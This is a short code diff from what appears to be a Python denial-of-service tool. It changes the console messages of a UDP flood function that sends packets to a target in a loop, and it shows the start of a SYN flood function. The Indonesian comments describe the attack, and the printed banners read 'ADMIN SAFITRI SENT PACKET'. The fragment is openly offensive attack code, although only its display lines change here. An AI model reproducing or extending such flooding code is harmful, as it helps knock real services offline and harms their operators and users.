@@ -93,8 +93,8 @@ def udp_flood(ip, port, message, duration):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"\033[97m[]  \033[103m\033[97mADMIN SAFITRI\033[0m   \033[38;5;206mSENT PACKET   \033[104m \033[32m{packet_count}\033[0")
-            print(f"\033[31m[]  \033[96mADMIN SAFITRI   \033[38;5;39m SENT PACKET   \033[33m{packet_count}\033[0")
+            print(f"\033[97m[]  \033[103m\033[97mADMIN SAFITRI\033[0m   \033[38;5;206mSENT PACKET   \033[104m \033[32m{packet_count}. \033[97mrunning\033[0")
+            print(f"\033[31m[]  \033[96mADMIN SAFITRI   \033[38;5;39m SENT PACKET   \033[33m{packet_count}. \033[32mrunning\033[0")
         except socket.error:
             # Jika soket tidak dapat mengirim paket, hentikan loop
             break
@@ -104,7 +104,7 @@ def udp_flood(ip, port, message, duration):
             break
 
     # Close the socket
-    s.close()
+    s.close() 
 
 # Fungsi untuk melakukan serangan SYN Flood
 def syn_flood(ip, port, duration):
